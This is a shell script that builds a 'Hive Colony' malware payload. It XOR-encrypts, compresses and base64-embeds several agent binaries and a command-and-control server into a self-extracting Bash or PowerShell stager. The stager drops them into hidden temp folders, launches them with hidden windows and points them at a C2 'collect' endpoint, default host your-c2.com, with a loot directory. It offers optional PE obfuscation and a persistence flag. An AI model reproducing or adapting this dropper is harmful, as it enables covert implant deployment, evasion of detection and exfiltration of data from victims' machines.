#!/usr/bin/env bash
# Hive Colony — Payload Generator (Monolithic Stager)
# Genera un script auto-extraíble con todos los agentes embebidos en base64.
# Pipeline: cargo build → XOR cipher → GZip → embed
#
# Uso: ./build_payload.sh [--windows] [--obfuscate] [--c2-host HOST] [--c2-port PORT] [--output FILE]
#   --windows        Target Windows (.exe)
#   --obfuscate      PE obfuscation (requiere --windows)
#   --c2-host HOST   C2 hostname (default: your-c2.com)
#   --c2-port PORT   C2 port (default: 8444)
#   --output FILE    Output file (default: hive_payload.sh)
#   --no-compress    Sin GZip (raw base64)
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $*"; }
ok()   { echo -e "  ${GREEN}✓${NC} $*"; }
warn() { echo -e "  ${YELLOW}⚠${NC} $*"; }
fail() { echo -e "  ${RED}✗${NC} $*"; exit 1; }

BASE="$(cd "$(dirname "$0")/.." && pwd)"
DEPLOY="${BASE}/scripts/deploy.sh"

# ── Defaults ──
OUTPUT="hive_payload.sh"
TARGET_WIN=0
OBFUSCATE=0
COMPRESS=true
C2_HOST="your-c2.com"
C2_PORT=8444
AGENTS=(queen worker drone honeybee weaver swarm c2-server)

while [[ $# -gt 0 ]]; do case "$1" in
    --windows)     TARGET_WIN=1; shift ;;
    --obfuscate)   OBFUSCATE=1; shift ;;
    --c2-host)     C2_HOST="$2"; shift 2 ;;
    --c2-port)     C2_PORT="$2"; shift 2 ;;
    --output)      OUTPUT="$2"; shift 2 ;;
    --no-compress) COMPRESS=false; shift ;;
    --help|-h)
        sed -n '3,15p' "$0"
        exit 0 ;;
    *) shift ;;
esac; done

# ── Build via deploy.sh ──
log "Building agents via deploy.sh..."
EXTRA=()
[[ $TARGET_WIN -eq 1 ]] && EXTRA+=(--windows)
[[ $OBFUSCATE -eq 1 ]] && EXTRA+=(--obfuscate)
"$DEPLOY" exe --c2-host "$C2_HOST" --c2-port "$C2_PORT" "${EXTRA[@]}"
"$DEPLOY" network --c2-host "$C2_HOST" --c2-port "$C2_PORT" "${EXTRA[@]}" > /dev/null 2>&1

# ── Cipher config (matches deploy.sh) ──
SEED=$RANDOM
XOR_KEY=$(( SEED % 256 ))
PADDING=$(( RANDOM % 512 + 64 ))

if [[ $TARGET_WIN -eq 1 ]]; then
    BIN_DIR="${BASE}/target/x86_64-pc-windows-gnu/release"
    EXT=".exe"
else
    BIN_DIR="${BASE}/target/release"
    EXT=""
fi

# ── Embed binaries ──
log "Embedding ${#AGENTS[@]} agents..."
STAGER_DIR=$(mktemp -d)
trap "rm -rf ${STAGER_DIR}" EXIT

for agent in "${AGENTS[@]}"; do
    bin="${BIN_DIR}/${agent}${EXT}"
    [[ ! -f "$bin" ]] && fail "Missing: ${bin}"

    # Optional PE obfuscation
    final_bin="$bin"
    if [[ $OBFUSCATE -eq 1 && $TARGET_WIN -eq 1 && "$agent" != "c2-server" ]]; then
        obf="${BASE}/payloads/obf_${agent}${EXT}"
        [[ -f "$obf" ]] && final_bin="$obf"
    fi

    if [[ "$COMPRESS" == true ]] && command -v gzip &>/dev/null; then
        python3 -c "
import base64, gzip
with open('${final_bin}', 'rb') as f:
    data = gzip.compress(f.read())
k = $XOR_KEY; pad = $PADDING
data = b'\\x00' * pad + bytes(b ^ k for b in data)
with open('${STAGER_DIR}/${agent}.b64', 'w') as f:
    f.write(base64.b64encode(data).decode())
" &
    else
        python3 -c "
import base64
with open('${final_bin}', 'rb') as f:
    data = f.read()
k = $XOR_KEY; pad = $PADDING
data = b'\\x00' * pad + bytes(b ^ k for b in data)
with open('${STAGER_DIR}/${agent}.b64', 'w') as f:
    f.write(base64.b64encode(data).decode())
" &
    fi
done
wait

# ── Generate monolithic stager ──
log "Generating stager: ${OUTPUT}..."

if [[ $TARGET_WIN -eq 1 ]]; then
    # ── Windows: PowerShell stager ──
    cat > "$OUTPUT" << 'PSEOF'
# Hive Colony Stager (Windows)
param([string]$C2Host = "", [int]$C2Port = 8444)
$ErrorActionPreference = "SilentlyContinue"
$tmp = "$env:TEMP\.h"
mkdir $tmp -Force | Out-Null
PSEOF

    for agent in "${AGENTS[@]}"; do
        b64=$(cat "${STAGER_DIR}/${agent}.b64")
        cat >> "$OUTPUT" << EOF
\$b64 = @" ${b64} "@
[IO.File]::WriteAllBytes("${tmp}\\${agent}.gz", [Convert]::FromBase64String(\$b64))
EOF
    done

    cat >> "$OUTPUT" << 'PSEOF2'
Get-ChildItem "$tmp\*.gz" | ForEach-Object {
    $dst = $_.FullName -replace '\.gz$',''
    $fs = [IO.File]::OpenRead($_.FullName)
    $gz = New-Object IO.Compression.GZipStream($fs, [IO.Compression.CompressionMode]::Decompress)
    $out = [IO.File]::OpenWrite($dst)
    $gz.CopyTo($out); $out.Close(); $gz.Close(); $fs.Close()
    Remove-Item $_.FullName
}
$env:__HIVE_ARENA = "hive_colony"; $env:HIVE_LAB_MODE = "1"
if ($C2Host) { $env:HIVE_C2_URL = "http://${C2Host}:${C2Port}/collect" }
Start-Process -WindowStyle Hidden "$tmp\c2-server.exe" -ArgumentList "--port $C2Port --loot-dir $tmp\loot --db-path $tmp\c2.db"
foreach ($a in @('queen','worker','drone','honeybee','weaver')) {
    $bin = "$tmp\$a.exe"
    if (Test-Path $bin) { Start-Process -WindowStyle Hidden $bin; Start-Sleep -Milliseconds 300 }
}
Write-Output "Hive Colony deployed: $tmp"
PSEOF2

else
    # ── Linux: Bash stager ──
    cat > "$OUTPUT" << 'BASHEOF'
#!/usr/bin/env bash
# Hive Colony Stager (Linux) — self-extracting
set -euo pipefail
C2_HOST="${C2_HOST:-}"; C2_PORT="${C2_PORT:-8444}"
INSTALL_DIR="${INSTALL_DIR:-/tmp/.hive}"
trap "rm -rf $INSTALL_DIR" EXIT; mkdir -p "$INSTALL_DIR/loot"; cd "$INSTALL_DIR"
BASHEOF

    for agent in "${AGENTS[@]}"; do
        b64=$(cat "${STAGER_DIR}/${agent}.b64")
        cat >> "$OUTPUT" << EOF
decode_${agent}() { base64 -d << 'B64EOF'
${b64}
B64EOF
}
EOF
    done

    cat >> "$OUTPUT" << 'BASHEOF2'
K=__XORKEY__; P=__PADDING__
for agent in queen worker drone honeybee weaver swarm c2-server; do
    data=$(decode_${agent})
    data=$(python3 -c "
import sys, gzip, base64
k=$K; p=$P
d=base64.b64decode(sys.stdin.read())
d=bytes(b ^ k for b in d)
sys.stdout.buffer.write(gzip.decompress(d[p:]))
" <<< "$data")
    echo "$data" > "${INSTALL_DIR}/${agent}"
    chmod +x "${INSTALL_DIR}/${agent}"
done
export __HIVE_ARENA="hive_colony" HIVE_LAB_MODE=1 RUST_LOG=info
[ -n "$C2_HOST" ] && export HIVE_C2_URL="http://${C2_HOST}:${C2_PORT}/collect"
"${INSTALL_DIR}/c2-server" --port "$C2_PORT" --loot-dir "${INSTALL_DIR}/loot" --db-path "${INSTALL_DIR}/c2.db" > /dev/null 2>&1 &
for i in $(seq 1 15); do
    curl -sf "http://127.0.0.1:${C2_PORT}/health" > /dev/null 2>&1 && break
    sleep 1
done
for agent in queen worker drone honeybee weaver swarm; do
    "${INSTALL_DIR}/${agent}" > /dev/null 2>&1 &
    sleep 0.3
done
echo "Hive Colony deployed: ${INSTALL_DIR}"
wait
BASHEOF2

    # Inject XOR key into stager
    sed -i "s/__XORKEY__/$XOR_KEY/g; s/__PADDING__/$PADDING/g" "$OUTPUT"
fi

chmod +x "$OUTPUT"
SIZE=$(du -h "$OUTPUT" | cut -f1)
ok "Payload: ${OUTPUT} (${SIZE})"
log "Deploy: bash ${OUTPUT}"
log "Or:     HIVE_PERSIST=1 bash ${OUTPUT}"
